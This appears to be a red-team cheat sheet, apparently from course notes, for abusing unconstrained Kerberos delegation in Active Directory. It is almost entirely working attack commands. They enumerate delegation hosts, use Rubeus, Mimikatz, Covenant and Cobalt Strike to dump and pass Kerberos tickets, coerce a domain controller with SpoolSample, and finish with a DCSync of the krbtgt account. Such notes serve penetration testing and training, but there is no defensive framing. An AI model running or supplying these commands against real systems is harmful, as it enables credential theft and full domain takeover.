## Powerview
``` powershell
Get-DomainComputer -Unconstrained
```

## BloodHound
``` a
MATCH (c:Computer {unconstraineddelegation:true }) RETURN c
```

## CobaltStrike
``` a
execute-assembly C:\tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10
[System.IO.File]::WriteAllBytes("Z:\backup\PTA\CRTE\tgt-sqladmin", [System.Convert]::FromBase64String($a))
```

## Covenant
``` a
Rubeus triage /luid:0x3c6cd2
Rubeus dump /luid:0x3c6cd2 /nowrap
Rubeus monitor /interval:5 /filteruser:[Name of DC]$
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
ImpersonateProcess 2768
```

## Mimikatz
``` a
privilege::debug sekurlsa::tickets
sekurlsa::tickets /export
kerberos::ptt [filename]
```

## spoolss to DC
``` a
execute-assembly C:\tools\SpoolSample\SpoolSample\bin\Release\Working_SpoolSample.exe [FROM] [TO] 
Assembly /assemblyname:"SpoolSample" /parameters:"CDC01 APPSRV01"
```

* check if running
``` a
PowerShell dir \\cdc01\pipe\spoolss
```

* fix format
``` batch
tr -d '\040\011\012\015'
```

* Covenant
``` a
Rubeus monitor /interval:5 /filteruser:[Name of DC]$
Rubeus createnetonly /program:C:\Windows\System32\cmd.exe
Rubeus ptt /luid:0x21d8e17 /ticket:[...snip...]
ImpersonateProcess 2768
```

* mimikatz
``` a
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```

* Covenant
``` a
DCSync prod\krbtgt
```

* https://github.com/dirkjanm/krbrelayx

